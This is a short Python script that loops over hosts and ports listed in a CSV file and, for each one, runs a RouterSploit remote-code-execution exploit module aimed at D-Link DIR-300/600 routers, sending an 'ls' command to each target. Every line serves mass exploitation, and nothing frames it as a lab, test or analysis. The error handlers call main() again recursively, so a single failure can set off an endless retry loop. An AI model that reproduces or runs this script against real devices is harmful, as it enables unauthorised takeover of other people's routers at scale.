from executor import execute

import os
import sys
import subprocess
from subprocess import Popen, PIPE, STDOUT
import csv
import requests


def main():
    try:
        with open('hosts.csv', 'r') as csvFile:
            try:
                reader = csv.reader(csvFile)
                for row in reader:
                    # print("======> Hosts Count: " + numberH)
                    host = str(row[0])
                    port = str(row[1])
                    cmdH = "python3 ./rsf.py -m exploits/routers/dlink/dir_300_600_rce -s " "\"target " + host + "\" -s " + "\"port " + port + "\""
                    print("===>> Attaking with >>" + str(cmdH))
                    execute(str(cmdH), input='ls\n')
            except:
                print("====== Kalb w ra7")
                main()
    except:
        print("====== IO issue!")
        main()


if __name__ == "__main__":
    main()
